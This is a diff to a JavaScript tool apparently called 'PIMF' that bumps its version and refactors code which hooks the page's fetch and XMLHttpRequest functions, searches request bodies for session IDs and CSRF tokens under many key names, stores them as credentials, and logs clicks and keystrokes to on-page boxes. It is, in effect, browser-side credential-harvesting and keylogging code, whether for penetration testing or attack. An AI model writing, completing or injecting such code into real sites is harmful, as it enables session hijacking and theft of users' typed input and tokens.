@@ -15,7 +15,7 @@ const Q = ( function(){
 
     const
         api_name = "PIMF",
-        version  = "1.50",
+        version  = "1.51",
         config   = {
             gui:null,
             txt:null,
@@ -24,16 +24,6 @@ const Q = ( function(){
                 ping:null
             }
         };
-
-    const
-        query_session_id = [
-            "session_id","session-id",
-            "SESS_ID","SESSION_ID",
-            "sid","SID","SESSION-ID",
-            "sessionID","sessionId",
-            "sessid","sessId","sesid",
-            "sessID","sesID","sesId", ];
-
 
     function request( url, method, headers, body=false ){
         return new Promise( async ( resolve, reject ) => {
@@ -170,7 +160,7 @@ const Q = ( function(){
         } catch(e){
             data = new URLSearchParams( body_txt );
         }
-        recursive_search_by_keys( query_session_id, data, (sid)=>{
+        recursive_search_by_keys( query.session_id, data, (sid)=>{
             if ( typeof( sid ) == "string" ){
                 add_to_set_array( "Session ID: " + sid.toString(),
                                   Q.data.log.credentials.session_ids );
@@ -188,6 +178,16 @@ const Q = ( function(){
                         value: f[ i ].value } );
             }
         }
+    }
+    function refresh(){
+        box_header.innerHTML = Q.data.log.headers.join("<br>");
+        box_info.innerHTML   = Q.data.log.credentials.session_ids.join("<br>");
+        let k = Q.data.log.events.keys,
+        t = "";
+        for ( let i=0; i < k.length; i++ ){
+            t += k[ i ].key + ".";
+        }
+        box_keylog.innerHTML = t;
     }
 
     function _log_click( e ){
@@ -365,18 +365,19 @@ const Q = ( function(){
         window.addEventListener( "click",       _on_page_click );
         input_cli.addEventListener( "keydown",  _on_cli_input );
     }
-    function refresh(){
-        box_header.innerHTML = Q.data.log.headers.join("<br>");
-        box_info.innerHTML   = Q.data.log.credentials.session_ids.join("<br>");
-        let k = Q.data.log.events.keys,
-            t = "";
-        for ( let i=0; i < k.length; i++ ){
-            t += k[ i ].key + ".";
-        }
-        box_keylog.innerHTML = t;
-    }
+
 
     const
+        query                         = {
+                                        session_id: [
+                                            "session_id","session-id",
+                                            "SESS_ID","SESSION_ID",
+                                            "sid","SID","SESSION-ID",
+                                            "sessionID","sessionId",
+                                            "sessid","sessId","sesid",
+                                            "sessID","sesID","sesId", ],
+                                            token: [
+                                                "csrf-token" ] },
         original_fetch_constructor    = fetch.constructor.prototype,
         original_xhr_open             = XMLHttpRequest
                                             .prototype.open,
@@ -484,7 +485,6 @@ const Q = ( function(){
             load_script( url );
         },
 
-    // TODO intercept form requests
         intercept: {
             start: function( callback, block_request=false ){
                 fetch.constructor.prototype = function( url, options ){
@@ -525,7 +525,7 @@ const Q = ( function(){
                 };
                 XMLHttpRequest.prototype.send = function( body ){
                     if ( body != null ){
-                        box_post.innerHTML += "<br><div style='color:var(--white);'>"
+                        box_post.innerHTML += "<div style='color:var(--white);'>"
                             + body
                             + "</div> ";
                     }
